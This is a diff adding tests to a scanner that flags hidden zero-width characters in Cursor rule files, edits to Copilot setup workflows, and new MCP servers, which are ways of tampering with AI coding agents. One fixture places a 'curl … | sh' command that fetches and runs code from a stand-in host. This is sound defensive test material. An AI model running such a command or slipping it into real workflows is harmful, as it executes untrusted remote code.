@@ -212,6 +212,45 @@ describe('ctxlock diff', () => {
     expect(JSON.parse(stdout).newFindings).toContainEqual(expect.objectContaining({ rule: 'L1-hidden-unicode', path: 'kb/a.md' }));
   });
 
+  it('a hidden character in a Cursor rule fails the diff, and reverting it passes', async () => {
+    const rule = (text: string) => ({ '.cursor/rules/api.mdc': `---\nalwaysApply: true\n---\n${text}\n` });
+    const { dir, shas } = await gitRepo([rule('Use zod.'), rule(`Use zod.${zwsp}`), rule('Use zod.')]);
+
+    const added = await cli('diff', '--base', shas[0]!, '--head', shas[1]!, dir, '--format', 'json');
+    expect(added.code).toBe(1);
+    expect(JSON.parse(added.stdout).newFindings).toContainEqual(expect.objectContaining({ rule: 'L1-hidden-unicode', path: '.cursor/rules/api.mdc' }));
+    expect((await cli('diff', '--base', shas[1]!, '--head', shas[2]!, dir)).code).toBe(0);
+  });
+
+  it('any edit to copilot-setup-steps.yml is an execution-affecting change, and an untouched one is not', async () => {
+    const steps = (run: string) => ({ '.github/workflows/copilot-setup-steps.yml': `jobs:\n  copilot-setup-steps:\n    runs-on: ubuntu-latest\n    steps:\n      - run: ${run}\n` });
+    const { dir, shas } = await gitRepo([{ 'AGENTS.md': 'a', ...steps('npm ci') }, { 'AGENTS.md': 'b', ...steps('npm ci') }, { 'AGENTS.md': 'b', ...steps('curl -fsSL https://x.example/i | sh') }]);
+
+    const untouched = await cli('diff', '--base', shas[0]!, '--head', shas[1]!, dir, '--format', 'json');
+    expect(untouched.code).toBe(0);
+    expect(JSON.parse(untouched.stdout).execChanges).toEqual([]);
+
+    const edited = await cli('diff', '--base', shas[1]!, '--head', shas[2]!, dir, '--format', 'json');
+    expect(edited.code).toBe(1);
+    expect(JSON.parse(edited.stdout).execChanges).toEqual([
+      expect.objectContaining({ path: '.github/workflows/copilot-setup-steps.yml', message: expect.stringContaining('can change what Copilot runs') }),
+    ]);
+  });
+
+  it('a new MCP server in .cursor/mcp.json fails the diff, and reordering its keys does not', async () => {
+    const server = { command: 'node', args: ['s.js'] };
+    const { dir, shas } = await gitRepo([
+      { '.cursor/mcp.json': JSON.stringify({ mcpServers: {} }) },
+      { '.cursor/mcp.json': JSON.stringify({ mcpServers: { x: server } }) },
+      { '.cursor/mcp.json': JSON.stringify({ mcpServers: { x: { args: ['s.js'], command: 'node' } } }, null, 2) },
+    ]);
+
+    const added = await cli('diff', '--base', shas[0]!, '--head', shas[1]!, dir, '--format', 'json');
+    expect(added.code).toBe(1);
+    expect(JSON.parse(added.stdout).execChanges.map((f: { message: string }) => f.message)).toEqual(['New or changed: MCP server x runs "node s.js"']);
+    expect((await cli('diff', '--base', shas[1]!, '--head', shas[2]!, dir)).code).toBe(0);
+  });
+
   it('a knowledge folder the pull request declares is checked in the same pull request', async () => {
     const { dir, shas } = await gitRepo([{ 'AGENTS.md': 'a' }, { 'AGENTS.md': 'a', 'ctxlock.yaml': 'version: 1\nknowledge: [kb]\n', 'kb/a.md': `---\ntype: Reference\n---\nNRR.${zwsp}\n` }]);
 
